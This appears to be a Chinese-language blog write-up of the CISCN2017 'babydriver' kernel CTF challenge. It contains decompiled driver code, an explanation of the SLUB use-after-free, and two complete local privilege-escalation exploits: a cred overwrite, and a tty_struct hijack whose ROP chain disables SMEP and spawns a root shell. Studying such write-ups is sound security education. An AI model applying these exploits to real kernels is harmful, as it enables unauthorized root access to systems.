---
layout: post
title: CISCN2017 babydriver
excerpt: "kernel pwn"
categories: [kernelpwn]
comments: true
---
https://xz.aliyun.com/t/5847?accounttraceid=a2648d7f44584deaa6f2b0a2a749dab8rwiz

总结: 这个就是比普通的rop多一个`mov cr4,0x6f0`关闭smep的操作

这道题目没有给出vmlinux,需要`./extract-vmlinux /boot/vmlinuz-4.4.0-38-generic > vmlinux`进行提取,其脚本如下
```
#!/bin/sh
# SPDX-License-Identifier: GPL-2.0-only
# ----------------------------------------------------------------------
# extract-vmlinux - Extract uncompressed vmlinux from a kernel image
#
# Inspired from extract-ikconfig
# (c) 2009,2010 Dick Streefland <dick@streefland.net>
#
# (c) 2011      Corentin Chary <corentin.chary@gmail.com>
#
# ----------------------------------------------------------------------

check_vmlinux()
{
	# Use readelf to check if it's a valid ELF
	# TODO: find a better to way to check that it's really vmlinux
	#       and not just an elf
	readelf -h $1 > /dev/null 2>&1 || return 1

	cat $1
	exit 0
}

try_decompress()
{
	# The obscure use of the "tr" filter is to work around older versions of
	# "grep" that report the byte offset of the line instead of the pattern.

	# Try to find the header ($1) and decompress from here
	for	pos in `tr "$1\n$2" "\n$2=" < "$img" | grep -abo "^$2"`
	do
		pos=${pos%%:*}
		tail -c+$pos "$img" | $3 > $tmp 2> /dev/null
		check_vmlinux $tmp
	done
}

# Check invocation:
me=${0##*/}
img=$1
if	[ $# -ne 1 -o ! -s "$img" ]
then
	echo "Usage: $me <kernel-image>" >&2
	exit 2
fi

# Prepare temp files:
tmp=$(mktemp /tmp/vmlinux-XXX)
trap "rm -f $tmp" 0

# That didn't work, so retry after decompression.
try_decompress '\037\213\010' xy    gunzip
try_decompress '\3757zXZ\000' abcde unxz
try_decompress 'BZh'          xy    bunzip2
try_decompress '\135\0\0\0'   xxx   unlzma
try_decompress '\211\114\132' xy    'lzop -d'
try_decompress '\002!L\030'   xxx   'lz4 -d'
try_decompress '(\265/\375'   xxx   unzstd

# Finally check for uncompressed images or objects:
check_vmlinux $img

# Bail out:
echo "$me: Cannot find vmlinux." >&2
```
然后
```
ROPgadget --binary vmlinux > 1.txt
```
启动脚本
```
#!/bin/bash

qemu-system-x86_64 -initrd morty.img -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -monitor /dev/nu
ll -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep -gdb tcp::1234
```
查看保护措施
```
/ $ more /proc/cpuinfo | grep smep
flags		: fpu de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx lm constant_tsc nopl xtopology pni cx16 hypervisor smep
```
查看版本
```
/ $ uname -a
Linux (none) 4.4.72 #1 SMP Thu Jun 15 19:52:50 PDT 2017 x86_64 GNU/Linux
```
查看当前版本结构体
```
struct cred {
    atomic_t    usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
    atomic_t    subscribers;    /* number of processes subscribed */
    void        *put_addr;
    unsigned    magic;
#define CRED_MAGIC  0x43736564
#define CRED_MAGIC_DEAD 0x44656144
#endif
    kuid_t      uid;        /* real UID of the task */
    kgid_t      gid;        /* real GID of the task */
    kuid_t      suid;       /* saved UID of the task */
    kgid_t      sgid;       /* saved GID of the task */
    kuid_t      euid;       /* effective UID of the task */
    kgid_t      egid;       /* effective GID of the task */
    kuid_t      fsuid;      /* UID for VFS ops */
    kgid_t      fsgid;      /* GID for VFS ops */
    unsigned    securebits; /* SUID-less security management */
    kernel_cap_t    cap_inheritable; /* caps our children can inherit */
    kernel_cap_t    cap_permitted;  /* caps we're permitted */
    kernel_cap_t    cap_effective;  /* caps we can actually use */
    kernel_cap_t    cap_bset;   /* capability bounding set */
    kernel_cap_t    cap_ambient;    /* Ambient capability set */
#ifdef CONFIG_KEYS
    unsigned char   jit_keyring;    /* default keyring to attach requested * keys to */
    struct key __rcu *session_keyring; /* keyring inherited over fork */
    struct key  *process_keyring; /* keyring private to this process */
    struct key  *thread_keyring; /* keyring private to this thread */
    struct key  *request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
    void        *security;  /* subjective LSM security */
#endif
    struct user_struct *user;   /* real user ID subscription */
    struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
    struct group_info *group_info;  /* supplementary groups for euid/fsgid */
    struct rcu_head rcu;        /* RCU deletion hook */
};
```
babyopen函数
```
__int64 __fastcall babyopen(inode *inode, file *filp, __int64 a3)
{
  char *v3; // rax@1

  _fentry__(inode, filp, a3);
  LODWORD(v3) = kmem_cache_alloc_trace(*((_QWORD *)&kmalloc_caches + 6), 37748928LL, 0x40LL);
  babydev_struct.device_buf = v3;
  babydev_struct.device_buf_len = 0x40LL;
  printk("device open\n", 37748928LL);
  return 0LL;
}
```
申请了0x40内存,然后将地址放在了babydev_struct.device_buf中,同时babydev_struct.device_buf_len长度设为0x40

babywrite函数
```
ssize_t __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset)
{
  size_t v4; // rdx@1
  ssize_t result; // rax@2
  ssize_t v6; // rbx@3

  _fentry__(filp, buffer, length);
  if ( babydev_struct.device_buf )
  {
    result = -2LL;
    if ( babydev_struct.device_buf_len > v4 )
    {
      v6 = v4;
      copy_from_user(babydev_struct.device_buf,buffer,v4);
      result = v6;
    }
  }
  else
  {
    result = -1LL;
  }
  return result;
}
```
先检查babydev_struct.device_buf_len长度是否大于v4，然后把buffer中的数据拷贝到babydev_struct.device_buf中

babyread
```
ssize_t __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset)
{
  size_t v4; // rdx@1
  ssize_t result; // rax@2
  ssize_t v6; // rbx@3

  _fentry__(filp, buffer, length);
  if ( babydev_struct.device_buf )
  {
    result = -2LL;
    if ( babydev_struct.device_buf_len > v4 )
    {
      v6 = v4;
      copy_to_user(buffer,babydev_struct.device_buf,v4);
      result = v6;
    }
  }
  else
  {
    result = -1LL;
  }
  return result;
}
```
先检查长度是否小于babydev_struct.device_buf_len,然后把 babydev_struct.device_buf 中的数据拷贝到buffer中

babyioctl
```
__int64 __fastcall babyioctl(file *filp, __int64 command, unsigned __int64 arg)
{
  size_t v3; // rdx@1
  size_t v4; // rbx@1
  char *v5; // rax@2
  __int64 result; // rax@2

  _fentry__(filp, command, arg);
  v4 = v3;
  if ( (_DWORD)command == 0x10001 )
  {
    kfree(babydev_struct.device_buf);
    LODWORD(v5) = _kmalloc(v4, 37748928LL);
    babydev_struct.device_buf = v5;
    babydev_struct.device_buf_len = v4;
    printk("alloc done\n", 37748928LL);
    result = 0LL;
  }
  else
  {
    printk(&unk_2EB, v3);
    result = -22LL;
  }
  return result;
}
```
这个函数定义了一个0x10001的命令，可以释放全局变量babydev_struct中的device_buf,再根据用户传递的size重新申请一块内存，并且更新device_buf_len
### 关于SLAB && SLUB
SLAB是一种内存管理机制,为了提高效率,SLAB要求系统暂时保留已经释放的内核对象空间，以便下次申请时不需要再次初始化和分配;但是，SLAB机制对内核对象的类型十分挑剔，只有类型和大小都完全一致的对象才能重用其空间;这就好比是装过鸡的笼子是不允许再去关兔子了,哪怕鸡和兔子的大小一样;
但是,和SLAB相比,SLUB对对象类型就没有限制,两个对象只要大小差不多就可以重用同一块内存,而不在乎类型是否相同;也就是说这次申请的空间的大小和上次释放的空间大小一样,那么这两个空间的地址会是一样的;SLUB机制就允许装过鸡的笼子再装兔子,只要大小ok就好.....
其实SLUB机制和堆分配机制是比较一样的,只是更加复杂一些....

#### 思路
如果我们打开了两个设备文件,也就是调用了两次babyopen函数，因为babydev_struct是全局的,第一次分配了buf,第二次其实将会覆盖第一次分配的buf;如果我们free了第一个buf，那么第二个其实就已经是被释放过的了,这样我们就制造了一个UAF漏洞了....
然后我们结合前面说的slub机制,我们可以想办法把某个进程的cred结构体被放进这个UAF的空间里.思路如下

- 首先打开两次设备，通过ioctl将babydev_struct大小为的cred结构体的大小(不同版本kernel的可能不一样,需要自己通过源码去算);
- 然后释放其中一个设备，fork出一个新进程，此时这个新进程的cre 的空间就会和之前释放的空间重叠;
- 最后,我们可以通过另一个文件描述符对这块空间进行写操作，只需要将uid，gid改为0，就可以实现root提权了....

最终poc
```
//kernel 4.4.72
//poc.c
//gcc poc.c -o poc -static -w
#include<stdio.h>
#include<fcntl.h>
#include <unistd.h>
int main(){
    int fd1,fd2,id;
    char cred[0xa8] = {0};				//设置cred相同的长度
    fd1 = open("dev/babydev",O_RDWR);
    fd2 = open("dev/babydev",O_RDWR);
    ioctl(fd1,0x10001,0xa8);			//释放第一个设备,并申请a8大小的内存
    close(fd1);							//关闭这个设备
    id = fork();
    if(id == 0){						//id=0时是子进程
        write(fd2,cred,28);				//写入28个0，一直把egid及其之前的值都变为成0，就会被认为是root了;
        if(getuid() == 0){
            printf("[*]welcome root:\n");
            system("/bin/sh");
            return 0;
        }
    }
    else if(id < 0){
        printf("[*]fork fail\n");
    }
    else{
        wait(NULL);
    }
    close(fd2);
    return 0;
}
```
关于fork函数的直白理解(https://blog.csdn.net/jason314/article/details/5640969)
```
#include <unistd.h>
#include <stdio.h> 
int main () 
{ 
	pid_t fpid; //fpid表示fork函数返回的值
	int count=0;
	fpid=fork(); 
	if (fpid < 0) 
		printf("error in fork!"); 
	else if (fpid == 0) {
		printf("i am the child process, my process id is %d/n",getpid()); 
		printf("我是爹的儿子/n");//对某些人来说中文看着更直白。
		count++;
	}
	else {
		printf("i am the parent process, my process id is %d/n",getpid()); 
		printf("我是孩子他爹/n");
		count++;
	}
	printf("统计结果是: %d/n",count);
	return 0;
}
```
连接gdb进行调试查看
```
gdb-peda$ target remote :1234
gdb-peda$ add-symbol-file ./babydriver.ko 0xffffffffc0000000
gdb-peda$ b babyioctl
gdb-peda$ b babywrite
```
### 本题的另一种解法
##### ptmx && tty_struct && tty_operations
ptmx设备是tty设备的一种,open函数被tty核心调用, 当一个用户对这个tty驱动被分配的设备节点调用open时tty核心使用一个指向分配给这个设备的tty_struct结构的指针调用它,也就是说我们在调用了open函数了之后会创建一个tty_struct结构体,然而最关键的是这个tty_struct也是通过kmalloc申请出来的一个堆空间,下面是关于tty_struct结构体申请的一部分源码:
```
struct tty_struct *alloc_tty_struct(struct tty_driver *driver, int idx)
{
    struct tty_struct *tty;

    tty = kzalloc(sizeof(*tty), GFP_KERNEL);
    if (!tty)
        return NULL;

    kref_init(&tty->kref);
    tty->magic = TTY_MAGIC;
    tty_ldisc_init(tty);
    tty->session = NULL;
    tty->pgrp = NULL;
    mutex_init(&tty->legacy_mutex);
    mutex_init(&tty->throttle_mutex);
    init_rwsem(&tty->termios_rwsem);
    mutex_init(&tty->winsize_mutex);
    init_ldsem(&tty->ldisc_sem);
    init_waitqueue_head(&tty->write_wait);
    init_waitqueue_head(&tty->read_wait);
    INIT_WORK(&tty->hangup_work, do_tty_hangup);
    mutex_init(&tty->atomic_write_lock);
    spin_lock_init(&tty->ctrl_lock);
    spin_lock_init(&tty->flow_lock);
    INIT_LIST_HEAD(&tty->tty_files);
    INIT_WORK(&tty->SAK_work, do_SAK_work);

    tty->driver = driver;
    tty->ops = driver->ops;
    tty->index = idx;
    tty_line_name(driver, idx, tty->name);
    tty->dev = tty_get_device(tty);

    return tty;
}
```
其中kzalloc:
```
static inline void *kzalloc(size_t size, gfp_t flags)
{
    return kmalloc(size, flags | __GFP_ZERO);
}
```
而正是这个kmalloc的原因,根据前面介绍的slub分配机制,我们这里仍然可以利用UAF漏洞去修改这个结构体....
这个tty_struct结构体的大小是0x2e0,源码如下:
```
struct tty_struct {
    int magic;
    struct kref kref;
    struct device *dev;
    struct tty_driver *driver;
    const struct tty_operations *ops;     // tty_operations结构体
    int index;
    /* Protects ldisc changes: Lock tty not pty */
    struct ld_semaphore ldisc_sem;
    struct tty_ldisc *ldisc;
    struct mutex atomic_write_lock;
    struct mutex legacy_mutex;
    struct mutex throttle_mutex;
    struct rw_semaphore termios_rwsem;
    struct mutex winsize_mutex;
    spinlock_t ctrl_lock;
    spinlock_t flow_lock;
    /* Termios values are protected by the termios rwsem */
    struct ktermios termios, termios_locked;
    struct termiox *termiox;    /* May be NULL for unsupported */
    char name[64];
    struct pid *pgrp;       /* Protected by ctrl lock */
    struct pid *session;
    unsigned long flags;
    int count;
    struct winsize winsize;     /* winsize_mutex */
    unsigned long stopped:1,    /* flow_lock */
              flow_stopped:1,
              unused:BITS_PER_LONG - 2;
    int hw_stopped;
    unsigned long ctrl_status:8,    /* ctrl_lock */
              packet:1,
              unused_ctrl:BITS_PER_LONG - 9;
    unsigned int receive_room;  /* Bytes free for queue */
    int flow_change;
    struct tty_struct *link;
    struct fasync_struct *fasync;
    wait_queue_head_t write_wait;
    wait_queue_head_t read_wait;
    struct work_struct hangup_work;
    void *disc_data;
    void *driver_data;
    spinlock_t files_lock;      /* protects tty_files list */
    struct list_head tty_files;
#define N_TTY_BUF_SIZE 4096
    int closing;
    unsigned char *write_buf;
    int write_cnt;
    /* If the tty has a pending do_SAK, queue it here - akpm */
    struct work_struct SAK_work;
    struct tty_port *port;
} __randomize_layout;
```
而在tty_struct结构体中有一个非常棒的结构体tty_operations,其源码如下:
```
struct tty_operations {
    struct tty_struct * (*lookup)(struct tty_driver *driver,
            struct file *filp, int idx);
    int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
    int  (*open)(struct tty_struct * tty, struct file * filp);
    void (*close)(struct tty_struct * tty, struct file * filp);
    void (*shutdown)(struct tty_struct *tty);
    void (*cleanup)(struct tty_struct *tty);
    int  (*write)(struct tty_struct * tty,
              const unsigned char *buf, int count);
    int  (*put_char)(struct tty_struct *tty, unsigned char ch);
    void (*flush_chars)(struct tty_struct *tty);
    int  (*write_room)(struct tty_struct *tty);
    int  (*chars_in_buffer)(struct tty_struct *tty);
    int  (*ioctl)(struct tty_struct *tty,
            unsigned int cmd, unsigned long arg);
    long (*compat_ioctl)(struct tty_struct *tty,
                 unsigned int cmd, unsigned long arg);
    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
    void (*throttle)(struct tty_struct * tty);
    void (*unthrottle)(struct tty_struct * tty);
    void (*stop)(struct tty_struct *tty);
    void (*start)(struct tty_struct *tty);
    void (*hangup)(struct tty_struct *tty);
    int (*break_ctl)(struct tty_struct *tty, int state);
    void (*flush_buffer)(struct tty_struct *tty);
    void (*set_ldisc)(struct tty_struct *tty);
    void (*wait_until_sent)(struct tty_struct *tty, int timeout);
    void (*send_xchar)(struct tty_struct *tty, char ch);
    int (*tiocmget)(struct tty_struct *tty);
    int (*tiocmset)(struct tty_struct *tty,
            unsigned int set, unsigned int clear);
    int (*resize)(struct tty_struct *tty, struct winsize *ws);
    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
    int (*get_icount)(struct tty_struct *tty,
                struct serial_icounter_struct *icount);
    void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);
#ifdef CONFIG_CONSOLE_POLL
    int (*poll_init)(struct tty_driver *driver, int line, char *options);
    int (*poll_get_char)(struct tty_driver *driver, int line);
    void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
#endif
    int (*proc_show)(struct seq_file *, void *);
} __randomize_layout;
```
可以看到这个里面全是我们最喜欢的函数指针....
当我们往上面所open的文件中进行write操作就会调用其中相对应的`int (*write)(struct tty_struct * tty,const unsigned char *buf, int count);函数....`

#### Smep
现在我们来说一下系统是怎么知道这个Smep保护机制是开启的还是关闭的....
在系统当中有一个CR4寄存器,它的值判断是否开启smep保护的关键，当CR4寄存器的第20位是1的时候,保护开启;是0到时候，保护关闭:


举一个例子:
当CR4的值为0x1407f0的时候，smep保护开启:
```
$CR4 = 0x1407f0 = 0b0001 0100 0000 0111 1111 0000
```
当CR4的值为0x6f0的时候，smep保护开启:
```
$CR4 = 0x6f0 = 0b0000 0000 0000 0110 1111 0000
```
但是该寄存器的值无法通过gdb直接查看，只能通过kernel crash时产生的信息查看,不过我们仍然是可以通过mov指令去修改这个寄存器的值的:
```
mov cr4,0x6f0
```
#### 利用思路
- 利用UAF漏洞,去控制利用tty_struct结构体的空间,修改真实的tty_operations的地址到我们构造的tty_operations
- 构造一个tty_operations，修改其中的write函数为我们的rop;
- 利用修改的write函数来劫持程序流

现在我们并没有控制到栈,所以在rop的时候需要想办法进行栈转移:

最终tty_operations的构造如下:
```
for(i = 0; i < 30; i++)
 {
     fake_tty_opera[i] = 0xffffffff8181bfc5; 
 }
 fake_tty_opera[0] = 0xffffffff810635f5;     //pop rax; pop rbp; ret;
 fake_tty_opera[1] = (size_t)rop;            //rop链的地址
 fake_tty_opera[3] = 0xffffffff8181bfC5;     // mov rsp,rax ; dec ebx ; ret
 fake_tty_opera[7] = 0xffffffff8181bfc5;     // mov rsp,rax ; dec ebx ; ret
```
我们把提权,关闭smep等操作都放到rop链里面:
```
int i = 0;
 size_t rop[20]={0};
 rop[i++] = 0xffffffff810d238d;      //pop_rdi_ret
 rop[i++] = 0x6f0;
 rop[i++] = 0xffffffff81004d80;      //mov_cr4_rdi_pop_rbp_ret
 rop[i++] = 0x6161616161;            //junk
 rop[i++] = (size_t)get_root;
 rop[i++] = 0xffffffff81063694;      //swapgs_pop_rbp_ret
 rop[i++] = 0x6161616161;
 rop[i++] = 0xffffffff814e35ef;      // iretq; ret;
 rop[i++] = (size_t)shell;
 rop[i++] = user_cs;
 rop[i++] = user_eflags;
 rop[i++] = user_sp;
 rop[i++] = user_ss;
```
这个rop链就是比我们的之前的ret2usr多了一个mov_cr4_rdi_pop_rbp_ret

#### 最终exp
```
#include<stdio.h>
#include<unistd.h>
#include<fcntl.h>
unsigned long user_cs, user_ss, user_eflags,user_sp;
size_t commit_creds_addr = 0xffffffff810a1420;
size_t prepare_kernel_cred_addr = 0xffffffff810a1810;
void* fake_tty_opera[30];

void shell(){
    system("/bin/sh");
}

void save_stats(){
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3\n"
        "pushfq\n"
        "popq %2\n"
        :"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
        :
        : "memory"
    );
}

void get_root(){
    char* (*pkc)(int) = prepare_kernel_cred_addr;
    void (*cc)(char*) = commit_creds_addr;
    (*cc)((*pkc)(0));
}

int main(){
    int fd1,fd2,fd3,i=0;
    size_t fake_tty_struct[4] = {0};
    size_t rop[20]={0};
    save_stats();

    rop[i++] = 0xffffffff810d238d;      //pop_rdi_ret
    rop[i++] = 0x6f0;
    rop[i++] = 0xffffffff81004d80;      //mov_cr4_rdi_pop_rbp_ret
    rop[i++] = 0x6161616161;
    rop[i++] = (size_t)get_root;
    rop[i++] = 0xffffffff81063694;      //swapgs_pop_rbp_ret
    rop[i++] = 0x6161616161;
    rop[i++] = 0xffffffff814e35ef;      // iretq; ret;
    rop[i++] = (size_t)shell;
    rop[i++] = user_cs;
    rop[i++] = user_eflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    for(i = 0; i < 30; i++){
        fake_tty_opera[i] = 0xffffffff8181bfc5;
    }
    fake_tty_opera[0] = 0xffffffff810635f5;     //pop rax; pop rbp; ret;
    fake_tty_opera[1] = (size_t)rop;
    fake_tty_opera[3] = 0xffffffff8181bfC5;     // mov rsp,rax ; dec ebx ; ret
    fake_tty_opera[7] = 0xffffffff8181bfc5;

    fd1 = open("/dev/babydev",O_RDWR);
    fd2 = open("/dev/babydev",O_RDWR);
    ioctl(fd1,0x10001,0x2e0);
    close(fd1);
    fd3 = open("/dev/ptmx",O_RDWR|O_NOCTTY);
    read(fd2, fake_tty_struct, 32);
    fake_tty_struct[3] = (size_t)fake_tty_opera;
    write(fd2,fake_tty_struct, 32);
    write(fd3,"cc-sir",6);                      //触发rop
    return 0;
}
```
编译
```
gcc poc.c -o poc -w -static
```
#### P.S
找mov_cr4_rdi_pop_rbp_ret等这些gadget的小技巧,如果使用ropper或ROPgadget工具太慢的时候,可以先试试用objdump去找看能不能找到:
```
objdump -d vmlinux -M intel | grep -E "cr4|pop|ret"
```
```
objdump -d vmlinux -M intel | grep -E "swapgs|pop|ret"
```